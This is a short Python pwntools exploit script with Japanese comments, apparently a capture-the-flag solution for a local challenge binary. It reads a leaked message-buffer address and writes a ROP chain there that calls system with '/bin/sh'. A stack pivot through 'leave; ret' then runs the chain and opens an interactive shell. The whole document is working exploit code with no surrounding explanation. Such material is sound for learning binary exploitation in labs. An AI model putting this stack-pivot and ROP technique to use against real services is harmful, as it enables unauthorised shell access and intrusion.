from pwn import *

binary = './chall'
p = process(binary)
# p = remote('localhost', 12300)

# 必要なアドレス
pop_rdi_ret_addr = 0x40117a    # pop rdi; ret
system_addr = 0x401040         # system()
leave_ret_addr = 0x401211      # leave; ret

# メッセージバッファのアドレスを取得
p.recvuntil(b"Here's the pointer to message: ")
message_addr = int(p.recvline().strip(), 16)
print(f"Message buffer address: {hex(message_addr)}")

# ROPチェーンをメッセージバッファに配置
rop_chain = p64(pop_rdi_ret_addr)        # pop rdi; ret
rop_chain += p64(message_addr + 0x18)    # "/bin/sh"のアドレス
rop_chain += p64(system_addr)            # system()を呼び出し
rop_chain += b"/bin/sh\x00"              # 文字列データ (メッセージバッファのアドレスから+0x18)

# パディングして0x30バイトにする
rop_chain = rop_chain.ljust(0x30, b"\x00")

# スタックピボット用のペイロード
payload = rop_chain                      # メッセージバッファにROPチェーンを配置
payload += p64(message_addr - 8)         # 新しいRBP（メッセージバッファの少し前）
payload += p64(leave_ret_addr)           # leave; ret

# ペイロードを送信
p.sendline(payload)
p.interactive()
